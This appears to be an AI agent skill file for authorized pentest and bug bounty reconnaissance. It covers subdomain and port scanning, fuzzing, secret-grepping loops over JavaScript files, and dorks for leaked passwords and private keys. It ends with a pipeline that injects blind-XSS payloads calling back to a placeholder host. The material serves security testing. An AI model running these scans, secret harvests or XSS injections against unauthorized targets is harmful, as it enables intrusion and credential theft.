---
name: recon-specialist
description: Black-box recon and attack-surface cartography specialist for authorized pentests and bug bounty — covers subdomain enumeration, DNS brute force, port scanning, HTTP fingerprinting, JS file analysis, parameter discovery, content discovery, GitHub dorking, Google/Shodan OSINT, HTTP request smuggling detection, sources-and-sinks mental model, and full pipeline automation. Use when starting an engagement or needing to map the attack surface. Triggers on: recon, reconnaissance, subdomain enumeration, attack surface, bug bounty recon, osint, subfinder, amass, httpx, nuclei, parameter discovery, ffuf, content discovery, js analysis.
---

# Skill: recon-specialist

## Trigger

Fire when the task involves:
- Starting an engagement and mapping the attack surface
- Subdomain enumeration and DNS reconnaissance
- Port scanning and HTTP service fingerprinting
- JS file analysis for secrets and endpoints
- Parameter and content discovery
- OSINT (GitHub dorks, Shodan, Google dorks, cert transparency)
- HTTP request smuggling black-box detection
- Building automated recon pipelines

## Instructions

### Phase 1 — Sources-and-Sinks Mental Model

Elite recon finds where attacker-controlled data ENTERS (sources) and where it is processed DANGEROUSLY (sinks):

```
Sources:
  URL parameters (GET/POST)
  HTTP headers (Host, Referer, X-Forwarded-For, User-Agent)
  Cookies and localStorage
  WebSocket messages
  File uploads
  GraphQL variables
  API request bodies

Sinks:
  SQL queries → SQLi
  Shell commands → Command injection
  Template rendering → SSTI
  HTML output → XSS
  File include/require → LFI/RFI
  Redirect targets → Open redirect
  DNS/HTTP fetch → SSRF
  Deserialization → Deserialization RCE
```

### Phase 2 — Subdomain Enumeration

```bash
# Install core tools
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest

# Passive enumeration (cert transparency + APIs)
subfinder -d target.com -all -recursive -o subdomains.txt

# DNS brute force
dnsx -l subdomains.txt -a -aaaa -cname -mx -ns -ptr -resp -o dns-results.txt

# amass (comprehensive OSINT)
# Installed via: go install github.com/owasp-amass/amass/v4/...@latest
amass enum -passive -d target.com -o amass-subs.txt

# Live host probing
cat subdomains.txt | httpx -silent -o live-hosts.txt -title -tech-detect -status-code -content-length

# reconFTW (all-in-one)
git clone https://github.com/six2dez/reconftw
cd reconftw/ && ./install.sh
./reconftw.sh -d target.com -r   # -r = full recon
```

### Phase 3 — Port Scanning + Service Fingerprinting

```bash
# Fast initial scan
nmap -T4 --open -p- target.com -oA nmap-full

# Service detection on open ports
nmap -sV -sC -p <open-ports> target.com -oA nmap-services

# httpx on all ports (finds web services on non-standard ports)
nmap -p- --open target.com | grep "open" | awk '{print $1}' | cut -d/ -f1 | \
  xargs -I{} echo "http://target.com:{}" | httpx -silent -status-code -title
```

### Phase 4 — Content and Parameter Discovery

```bash
# ffuf — content discovery (fastest)
go install github.com/ffuf/ffuf/v2@latest
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://target.com/FUZZ \
  -mc 200,301,302,403 -t 50 -o ffuf-dirs.txt

# ffuf — parameter fuzzing
ffuf -w params.txt -u "http://target.com/page?FUZZ=test" -mc 200 -t 50

# feroxbuster (recursive directory busting)
git clone https://github.com/epi052/feroxbuster
feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/common.txt --auto-tune

# arjun — hidden parameter discovery
pip3 install arjun
arjun -u http://target.com/api/endpoint
arjun -u http://target.com/api/endpoint -m POST

# gau + waybackurls — historical URL discovery
go install github.com/lc/gau/v2/cmd/gau@latest
gau target.com | uro > historical-urls.txt
```

### Phase 5 — JS File Analysis

```bash
# Extract all JS file URLs
cat live-hosts.txt | while read url; do
  curl -s "$url" | grep -oP 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//'
done > js-files.txt

# Download and search for secrets
cat js-files.txt | while read js; do
  curl -sL "$js" | grep -oP '(api[_\-]?key|token|secret|password|auth)["\s:=]+["\'][^"\']{10,}' >> secrets.txt
done

# LinkFinder — extract endpoints from JS
git clone https://github.com/GerbenJavado/LinkFinder
pip3 install -r requirements.txt
python3 linkfinder.py -i https://target.com/app.js -o cli

# Extract hidden endpoints from all JS files
cat js-files.txt | while read js; do
  python3 linkfinder.py -i "$js" -o cli 2>/dev/null
done | sort -u > endpoints.txt
```

### Phase 6 — OSINT: Google Dorks + GitHub + Shodan

**Google dorks**
```
site:target.com filetype:env
site:target.com filetype:config
site:target.com inurl:admin
site:target.com inurl:api
site:target.com "api_key" OR "apikey" OR "secret"
site:target.com ext:php intitle:"index of"
```

**GitHub dorks (code search)**
```
org:target "api_key"
org:target "password"
org:target "BEGIN RSA PRIVATE KEY"
"target.com" "password"
"target.com" extension:env
"target.com" extension:pem
"target.com" extension:key
```

**Shodan**
```
hostname:target.com
ssl:"target.com" port:443
org:"Target Corp" port:8080
```

**Cert transparency (crt.sh)**
```bash
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[].name_value' | sort -u | grep -v '*' > ct-subs.txt
```

### Phase 7 — HTTP Request Smuggling Detection

```bash
# defparam/smuggler — quick CL.TE / TE.CL detection
git clone https://github.com/defparam/smuggler
python3 smuggler.py -u "https://target.com/"

# PortSwigger http-terminator — AI-assisted desync factory
git clone https://github.com/PortSwigger/http-terminator
cd http-terminator/seeker
pip install anthropic requests
python3 seeker.py --url https://target.com/ --method GET
```

### Phase 8 — Abuse-Flow Analysis

After mapping the surface, enumerate these flows:
```
1. Password reset → predictable tokens? host header injection?
2. OAuth flows → state parameter? redirect_uri bypass?
3. File upload → extension bypass? path traversal?
4. Payment flows → price manipulation? currency confusion?
5. Rate limiting → IP rotation bypass? header forgery?
6. Multi-tenancy → IDOR across accounts? tenant ID in URL?
7. API versioning → v1 endpoints still live and less protected?
```

### Phase 9 — Automated Full Pipeline

```bash
# One-command black-box recon (reconFTW)
./reconftw.sh -d target.com -r -o ./output/

# Or manual chain:
subfinder -d target.com -all -o subs.txt
cat subs.txt | httpx -silent -o live.txt
cat live.txt | nuclei -t cves/ -t exposures/ -o nuclei-findings.txt
cat live.txt | gau | uro | kxss | grep -oP 'url: \K\S+' | dalfox pipe --blind https://your.ezxss.com/payload &
cat live.txt | ffuf -w big.txt -u FUZZ/FUZZ -mc 200,403 -t 100 &
```

## References

- six2dez/reconftw — https://github.com/six2dez/reconftw (~7,000 stars, GPLv3)
- awarexone/Agentic-Bug-Hunter — https://github.com/awarexone/Agentic-Bug-Hunter (MIT)
- projectdiscovery/subfinder — https://github.com/projectdiscovery/subfinder (MIT)
- projectdiscovery/httpx — https://github.com/projectdiscovery/httpx (MIT)
- projectdiscovery/nuclei — https://github.com/projectdiscovery/nuclei (MIT)
- projectdiscovery/nuclei-templates — https://github.com/projectdiscovery/nuclei-templates (Apache-2.0)
- h0tak88r/Sec-88 — https://github.com/h0tak88r/Sec-88 (knowledge reference)
- ffuf/ffuf — https://github.com/ffuf/ffuf (MIT)
- GerbenJavado/LinkFinder — https://github.com/GerbenJavado/LinkFinder (MIT)
- PortSwigger/http-terminator — https://github.com/PortSwigger/http-terminator (AGPL-3.0)
- lyftium/claude-bughunter — https://github.com/lyftium/claude-bughunter
- Source reports: apex-hunter-deep-research-2026-10-27.md, pentest-conductor-deep-research-2026-10-27.md